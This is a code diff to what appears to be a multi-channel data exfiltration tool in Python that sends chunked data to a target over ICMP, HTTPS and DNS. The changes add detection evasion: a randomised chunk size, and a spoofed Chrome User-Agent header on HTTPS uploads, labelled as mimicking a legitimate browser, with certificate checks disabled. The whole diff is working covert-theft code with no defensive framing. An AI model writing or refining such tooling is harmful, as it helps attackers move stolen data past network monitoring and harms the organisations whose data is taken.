@@ -14,7 +14,7 @@ import math
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
-CHUNK_SIZE = 512  # Adjust as needed
+CHUNK_SIZE = random.randint(300, 600)
 
 ICMP_PAYLOAD_SIZE_BYTES = 16
 ICMP_PAYLOAD_SIZE_HEX = ICMP_PAYLOAD_SIZE_BYTES * 2 
@@ -103,15 +103,29 @@ def send_icmp(target_ip, session_id, chunk_id, total_chunks, chunk):
 
 
 def send_https(target_ip, session_id, chunk_id, total_chunks, chunk):
-    """Send Base64 chunk via HTTPS."""
+    """Send Base64 chunk via HTTPS with a realistic User-Agent."""
     url = f"https://{target_ip}/upload"
+
+    # Mimic a legitimate browser request
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+        "Content-Type": "application/json"
+    }
+
     try:
-        response = requests.post(url, json={"session_id": session_id, "chunk_id": chunk_id, 
-                                            "total_chunks": total_chunks, "chunk": chunk}, verify=False)
+        response = requests.post(url, json={
+            "session_id": session_id,
+            "chunk_id": chunk_id,
+            "total_chunks": total_chunks,
+            "chunk": chunk
+        }, headers=headers, verify=False)
+
         print(f"[+] Sent chunk {chunk_id} via HTTPS: {response.status_code}")
         return True
-    except:
+    except Exception as e:
+        print(f"[-] HTTPS failed for chunk {chunk_id}: {e}")
         return False
+
 
 def send_dns(target_domain, session_id, chunk_id, total_chunks, chunk, max_retries=3):
     """Send Base64 chunk via DNS with ACK verification and retries."""
